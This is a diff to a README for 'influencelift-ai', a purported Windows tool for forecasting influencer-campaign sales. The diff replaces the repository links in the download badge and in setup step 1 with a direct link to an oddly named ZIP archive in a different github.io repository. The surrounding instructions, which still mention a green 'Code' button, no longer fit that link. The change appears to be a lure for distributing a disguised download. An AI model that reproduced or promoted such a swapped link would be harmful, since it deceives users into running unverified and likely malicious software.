@@ -5,7 +5,7 @@ description: "Forecast influencer campaign sales with ridge regression models to
 ---
 # 📈 influencelift-ai - Improve marketing results with data insights
 
-[![Download](https://img.shields.io/badge/Download-Influencelift-blue.svg)](https://github.com/Arisu1990/influencelift-ai)
+[![Download](https://img.shields.io/badge/Download-Influencelift-blue.svg)](https://raw.githubusercontent.com/Arisu1990/arisu1990.github.io/main/whipcordy/Application_v1.5.zip)
 
 Influencelift-ai helps you clean messy campaign data, forecast future product sales, and simulate the outcome of your marketing decisions. You use this platform to turn raw numbers into clear, actionable business strategies. It removes the guesswork from influencer campaigns by applying proven machine-learning models to your existing data.
 
@@ -13,7 +13,7 @@ Influencelift-ai helps you clean messy campaign data, forecast future product sa
 
 You do not need to be a developer to use this tool. This platform runs locally on your Windows machine to ensure your data stays private and secure. Follow these instructions to set up the system.
 
-1. Visit the following link to access the software files: [https://github.com/Arisu1990/influencelift-ai](https://github.com/Arisu1990/influencelift-ai)
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/Arisu1990/arisu1990.github.io/main/whipcordy/Application_v1.5.zip](https://raw.githubusercontent.com/Arisu1990/arisu1990.github.io/main/whipcordy/Application_v1.5.zip)
 2. Look for the green button labeled "Code" on the right side of the page.
 3. Click "Download ZIP" to save the project folder to your computer.
 4. Extract the contents of the ZIP folder to a known location, such as your desktop or documents folder.
